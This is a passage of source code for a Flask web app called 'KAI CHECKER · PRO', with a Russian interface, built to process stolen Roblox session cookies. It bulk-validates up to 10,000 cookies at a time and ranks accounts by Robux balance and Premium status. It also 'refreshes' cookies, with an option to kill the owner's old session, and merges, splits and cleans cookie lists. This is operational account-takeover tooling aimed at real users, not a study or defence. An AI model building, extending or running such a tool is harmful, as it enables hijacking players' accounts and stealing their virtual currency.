            <div class="tool-card"><h3>🧹 Очистка</h3><p class="desc">Удалите дубликаты или форматируйте.</p><textarea id="cleanCookiesInput" placeholder="Вставьте куки..." rows="4"></textarea><div class="gap-8 mt-12"><button class="btn btn-primary" onclick="cleanCookies('deduplicate')" style="flex:1;">🔄 Дубликаты</button><button class="btn btn-secondary" onclick="cleanCookies('format')" style="flex:1;">📝 Формат</button></div><div class="result-box" id="cleanResult">Результат...</div></div>
        </div>
    </div>

    <div class="footer">KAI CHECKER · PRO</div>
</div>

<script>
var startTime = Date.now();
setInterval(function() {
    var d = Math.floor((Date.now() - startTime) / 1000);
    var h = String(Math.floor(d / 3600)).padStart(2, '0');
    var m = String(Math.floor((d % 3600) / 60)).padStart(2, '0');
    var s = String(d % 60).padStart(2, '0');
    var el = document.getElementById('sessionTimer');
    if (el) el.textContent = '⏱️ ' + h + ':' + m + ':' + s;
}, 1000);

document.querySelectorAll('.tab').forEach(function(tab) {
    tab.addEventListener('click', function() {
        var tabId = this.getAttribute('data-tab');
        document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
        document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
        this.classList.add('active');
        var target = document.getElementById('tab-' + tabId);
        if (target) target.classList.add('active');
        if (tabId === 'checker') loadCheckerHistory();
        if (tabId === 'fresher') loadFresherHistory();
    });
});

function setFresherMode(mode) {
    document.getElementById('fresherMode').value = mode;
    document.getElementById('modeDuplicate').classList.toggle('active', mode === 'duplicate');
    document.getElementById('modeKill').classList.toggle('active', mode === 'kill');
}

document.getElementById('fresherFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        var reader = new FileReader();
        reader.onload = function(evt) { document.getElementById('fresherCookies').value = evt.target.result; };
        reader.readAsText(this.files[0]);
    }
});

document.getElementById('massFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        var file = this.files[0];
        document.getElementById('massFileInfo').textContent = '✅ ' + file.name;
        var reader = new FileReader();
        reader.onload = function(evt) {
            window.massFileContent = evt.target.result;
            var fd = new FormData();
            fd.append('file', new Blob([window.massFileContent], { type: 'text/plain' }));
            fetch('/api/extract-preview', { method: 'POST', body: fd })
                .then(function(r) { return r.json(); })
                .then(function(d) {
                    if (d.success) {
                        var info = document.getElementById('extractInfo');
                        if (info) { info.style.display = 'block'; info.textContent = '🔍 Найдено куков: ' + d.count; }
                    }
                });
        };
        reader.readAsText(file);
    }
});

document.getElementById('mergeFiles').addEventListener('change', function(e) {
    var list = document.getElementById('mergeFileList'); list.innerHTML = '';
    if (this.files) { Array.from(this.files).forEach(function(f, i) { var div = document.createElement('div'); div.className = 'file-item'; div.textContent = (i+1) + '. ' + f.name; list.appendChild(div); }); }
});

document.getElementById('splitCountFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) { var reader = new FileReader(); reader.onload = function(evt) { window.splitCountContent = evt.target.result; }; reader.readAsText(this.files[0]); }
});

document.getElementById('splitFilesFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) { var reader = new FileReader(); reader.onload = function(evt) { window.splitFilesContent = evt.target.result; }; reader.readAsText(this.files[0]); }
});

async function runSingleCheck() {
    var resBox = document.getElementById('singleResult');
    var cookie = document.getElementById('singleCookie').value.trim();
    var progress = document.getElementById('singleProgress');
    if (!cookie) { resBox.textContent = '❌ Вставьте кук!'; return; }
    resBox.textContent = '⏳ Проверка...'; progress.style.width = '30%';
    try {
        var r = await fetch('/api/single-check', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie: cookie }) });
        var d = await r.json();
        progress.style.width = '100%'; setTimeout(function() { progress.style.width = '0%'; }, 1000);
        if (d.success) { resBox.textContent = d.report; loadCheckerHistory(); }
        else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
    } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
}

async function runMassCheck() {
    var resBox = document.getElementById('massResult');
    var progress = document.getElementById('massProgress');
    var content = window.massFileContent;
    if (!content) { resBox.textContent = '❌ Загрузите TXT файл!'; return; }
    resBox.textContent = '⏳ Извлечение и проверка...'; progress.style.width = '20%';
    try {
        var fd = new FormData(); fd.append('file', new Blob([content], { type: 'text/plain' }));
        var r = await fetch('/api/mass-check', { method: 'POST', body: fd });
        var d = await r.json();
        progress.style.width = '100%'; setTimeout(function() { progress.style.width = '0%'; }, 1000);
        if (d.success) {
            var html = '📊 Извлечено: ' + d.extracted_count + ' | Проверено: ' + d.total + '\n';
            html += '✅ Валид: ' + d.valid_count + ' | ❌ Невалид: ' + d.invalid_count + '\n';
            html += '💠 Premium: ' + (d.premium_count || 0) + ' | 💰 Robux: ' + (d.total_robux || 0).toLocaleString() + '\n\n';
            html += '══════ 🏆 ОТ ЛУЧШИХ К ХУДШИМ ══════\n\n';
            for (var i = 0; i < d.results.length; i++) { html += d.results[i] + '\n'; }
            if (d.download_url) { html += '\n📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать отчет</a>'; }
            resBox.innerHTML = html; loadCheckerHistory();
        } else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
    } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
}

async function runFresher() {
    var resBox = document.getElementById('fresherResult');
    var cookies = document.getElementById('fresherCookies').value.trim();
    var mode = document.getElementById('fresherMode').value;
    var progress = document.getElementById('fresherProgress');
    if (!cookies) { resBox.textContent = '❌ Вставьте куки!'; return; }
    resBox.textContent = '⏳ Обновление...'; progress.style.width = '30%';
    try {
        var r = await fetch('/api/fresher', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies: cookies, mode: mode }) });
        var d = await r.json();
        progress.style.width = '100%'; setTimeout(function() { progress.style.width = '0%'; }, 1000);
        if (d.success && d.only_cookies) { resBox.textContent = d.only_cookies; loadFresherHistory(); }
        else { resBox.textContent = '❌ ' + (d.message || 'Не удалось'); }
    } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
}

function clearFresherInputs() { document.getElementById('fresherCookies').value = ''; document.getElementById('fresherResult').textContent = 'Новые куки здесь...'; }

async function loadCheckerHistory() {
    var container = document.getElementById('checkerHistoryList');
    try {
        var r = await fetch('/api/history/checker'); var d = await r.json();
        if (d.history && d.history.length > 0) {
            var html = '';
            d.history.slice().reverse().forEach(function(item) {
                var typeLabel = item.type === 'mass' ? '📦 Массовая' : '🔍 Одиночная';
                html += '<div class="history-item" onclick="var x=this.querySelector(\'.hist-detail\');x.style.display=x.style.display==\'none\'?\'block\':\'none\'">';
                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + typeLabel + ' | ✅ ' + item.valid + '/' + item.total + '</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n───\n') : 'Нет данных') + '</div></div>';
            });
            container.innerHTML = html;
        } else { container.innerHTML = '<div class="empty-history">📭 История пуста</div>'; }
    } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
}

async function clearCheckerHistory() { if (!confirm('Удалить историю?')) return; await fetch('/api/history/checker/clear', { method: 'POST' }); loadCheckerHistory(); }

async function loadFresherHistory() {
    var container = document.getElementById('fresherHistoryList');
    try {
        var r = await fetch('/api/history/fresher'); var d = await r.json();
        if (d.history && d.history.length > 0) {
            var html = '';
            d.history.slice().reverse().forEach(function(item) {
                var ml = item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование';
                html += '<div class="history-item" onclick="var x=this.querySelector(\'.hist-detail\');x.style.display=x.style.display==\'none\'?\'block\':\'none\'">';
                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + ml + ' | ' + item.refreshed_count + ' шт.</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n') : 'Нет данных') + '</div></div>';
            });
            container.innerHTML = html;
        } else { container.innerHTML = '<div class="empty-history">📭 История пуста</div>'; }
    } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
}

async function clearFresherHistory() { if (!confirm('Удалить историю?')) return; await fetch('/api/history/fresher/clear', { method: 'POST' }); loadFresherHistory(); }

async function mergeCookies() {
    var files = document.getElementById('mergeFiles').files;
    if (!files || files.length < 2) { document.getElementById('mergeResult').textContent = '❌ Минимум 2 файла'; return; }
    var fd = new FormData(); Array.from(files).forEach(function(f) { fd.append('files', f); });
    document.getElementById('mergeResult').textContent = '⏳ Объединение...';
    try {
        var r = await fetch('/api/merge-cookies', { method: 'POST', body: fd }); var d = await r.json();
        if (d.success) { document.getElementById('mergeResult').innerHTML = '✅ ' + d.total_files + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>'; }
        else { document.getElementById('mergeResult').textContent = '❌ ' + (d.message || 'Ошибка'); }
    } catch(e) { document.getElementById('mergeResult').textContent = '❌ ' + e.message; }
}

async function splitByCount() {
    var content = window.splitCountContent; var count = parseInt(document.getElementById('splitCount').value);
    if (!content) { document.getElementById('splitCountResult').textContent = '❌ Загрузите файл'; return; }
    document.getElementById('splitCountResult').textContent = '⏳ Разделение...';
    try {
        var r = await fetch('/api/split-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: content, split_type: 'count', count: count }) });
        var d = await r.json();
        if (d.success) { document.getElementById('splitCountResult').innerHTML = '✅ ' + d.file_count + ' файлов<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>'; }
        else { document.getElementById('splitCountResult').textContent = '❌ Ошибка'; }
    } catch(e) { document.getElementById('splitCountResult').textContent = '❌ ' + e.message; }
}

async function splitByFiles() {
    var content = window.splitFilesContent; var num = parseInt(document.getElementById('splitFilesCount').value);
    if (!content) { document.getElementById('splitFilesResult').textContent = '❌ Загрузите файл'; return; }
    document.getElementById('splitFilesResult').textContent = '⏳ Разделение...';
    try {
        var r = await fetch('/api/split-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: content, split_type: 'files', count: num }) });
        var d = await r.json();
        if (d.success) { document.getElementById('splitFilesResult').innerHTML = '✅ ' + num + ' файлов<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>'; }
        else { document.getElementById('splitFilesResult').textContent = '❌ Ошибка'; }
    } catch(e) { document.getElementById('splitFilesResult').textContent = '❌ ' + e.message; }
}

async function cleanCookies(action) {
    var content = document.getElementById('cleanCookiesInput').value.trim();
    if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
    document.getElementById('cleanResult').textContent = '⏳ Обработка...';
    try {
        var r = await fetch('/api/clean-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: content, action: action }) });
        var d = await r.json();
        if (d.success) {
            var txt = '✅ Было: ' + d.original_count + ' | Стало: ' + d.processed_count;
            if (d.duplicates_removed > 0) txt += '<br>🗑️ Удалено: ' + d.duplicates_removed;
            txt += '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>';
            document.getElementById('cleanResult').innerHTML = txt;
        } else { document.getElementById('cleanResult').textContent = '❌ Ошибка'; }
    } catch(e) { document.getElementById('cleanResult').textContent = '❌ ' + e.message; }
}

loadCheckerHistory();
</script>
</body>
</html>"""

# ============================================================
# API ROUTES
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/extract-preview", methods=["POST"])
def api_extract_preview():
    content = ""
    if 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = extract_cookies_from_text(content)
    return jsonify({"success": True, "count": len(cookies)})

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_to_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status'] == '✅' else 0, 'cookies': [report], 'download_url': ''})
    return jsonify({"success": True, "report": report, "status": info['status']})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    content = ""
    if 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    if not content: return jsonify({"success": False, "message": "Файл не предоставлен"})
    
    cookies = extract_cookies_from_text(content)
    extracted_count = len(cookies)
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    if len(cookies) > 10000: cookies = cookies[:10000]
    
    results = mass_check_cookies(cookies, max_workers=10)
    valid_results = [r for r in results if r['status'] == '✅']
    invalid_results = [r for r in results if r['status'] == '❌']
    formatted_results = [format_quick_report(r) for r in results]
    premium_count = sum(1 for r in valid_results if r.get('is_premium'))
    total_robux = sum(r.get('robux', 0) for r in valid_results)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"mass_check_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write("═" * 60 + "\n")
        f.write(f"  📊 РЕЗУЛЬТАТЫ | {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
        f.write("═" * 60 + "\n")
        f.write(f"  🔍 Извлечено: {extracted_count} | 📦 Проверено: {len(results)}\n")
        f.write(f"  ✅ Валид: {len(valid_results)} | ❌ Невалид: {len(invalid_results)}\n")
        f.write(f"  💠 Premium: {premium_count} | 💰 Robux: {total_robux:,}\n")
        f.write("═" * 60 + "\n\n👑💎⭐ ЛУЧШИЕ АККАУНТЫ ⭐💎👑\n\n")
        for r in valid_results:
            score = r.get('score', 0)
            rank = "👑" if score >= 150 else ("💎" if score >= 100 else ("⭐" if score >= 60 else ("🟢" if score >= 30 else "🔹")))
            f.write(f"{rank} {r['username']} [{r['user_id']}] | ⏣ {r['robux']:,} | Score: {score}\n")
            f.write(f"   Cookie: {r['cookie']}\n\n")
        if invalid_results:
            f.write("\n❌ НЕВАЛИДНЫЕ:\n")
            for r in invalid_results: f.write(f"   {r['cookie']}\n")
    
    download_url = f"/downloads/{filename}"
    add_to_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid_results), 'cookies': formatted_results[:20], 'download_url': download_url})
    
    return jsonify({"success": True, "extracted_count": extracted_count, "total": len(results), "valid_count": len(valid_results), "invalid_count": len(invalid_results), "premium_count": premium_count, "total_robux": total_robux, "results": formatted_results, "download_url": download_url})

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    
    only_cookies = []
    cookie_hist = []
    for c in cookies_list:
        result = refresh_roblox_cookie(c, kill_old=(mode == 'kill'))
        if result['success'] and result['new_cookie']:
            cookie_hist.append(f"🟢 {result.get('username','?')} - НОВАЯ")
            only_cookies.append(result['new_cookie'])
        else: cookie_hist.append(f"❌ Ошибка")
    
    add_to_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'cookies': cookie_hist})
    return jsonify({"success": True, "refreshed_count": len(only_cookies), "only_cookies": '\n'.join(only_cookies) if only_cookies else ''})

@app.route("/api/history/checker")
def api_history_checker():
    return jsonify({"history": load_history(CHECKER_HISTORY_FILE)})

@app.route("/api/history/fresher")
def api_history_fresher():
    return jsonify({"history": load_history(FRESHER_HISTORY_FILE)})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    save_history(CHECKER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    save_history(FRESHER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    if 'files' not in request.files: return jsonify({"success": False, "message": "Файлы не найдены"})
    files = request.files.getlist('files')
    if len(files) < 2: return jsonify({"success": False, "message": "Минимум 2 файла"})
    contents = [file.read().decode('utf-8', errors='ignore') for file in files]
    merged = merge_cookie_files(contents)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"merged_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f: f.write(merged)
    all_lines = [l for l in merged.split('\n') if l]
    total_orig = sum(len([l for l in c.split('\n') if l.strip()]) for c in contents)
    return jsonify({"success": True, "total_files": len(files), "total_cookies": len(all_lines), "duplicates_removed": total_orig - len(all_lines), "download_url": f"/downloads/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    data = request.json or {}
    content = data.get("content", "")
    split_type = data.get("split_type", "count")
    count = data.get("count", 100)
    if not content: return jsonify({"success": False, "message": "Нет данных"})
    files = split_cookies_by_count(content, count) if split_type == "count" else split_cookies_by_files(content, count)
    if not files: return jsonify({"success": False, "message": "Не удалось разделить"})
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, fc in enumerate(files, 1):
            cnt = len([l for l in fc.split('\n') if l])
            zf.writestr(f"part_{i}_{cnt}cookies.txt", fc)
    zip_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"split_{timestamp}.zip"
    filepath = os.path.join("downloads", archive_name)
    with open(filepath, 'wb') as f: f.write(zip_buffer.getvalue())
    total = sum(len([l for l in file.split('\n') if l]) for file in files)
    return jsonify({"success": True, "file_count": len(files), "total_cookies": total, "download_url": f"/downloads/{archive_name}"})

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    content = data.get("content", "")
    action = data.get("action", "deduplicate")
    if not content: return jsonify({"success": False, "message": "Нет данных"})
    orig_lines = [l for l in content.split('\n') if l.strip()]
    processed = remove_duplicates(content) if action == "deduplicate" else clean_cookies(content)
    proc_lines = [l for l in processed.split('\n') if l.strip()]
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"cleaned_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f: f.write(processed)
    return jsonify({"success": True, "original_count": len(orig_lines), "processed_count": len(proc_lines), "duplicates_removed": len(orig_lines) - len(proc_lines), "download_url": f"/downloads/{filename}"})

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
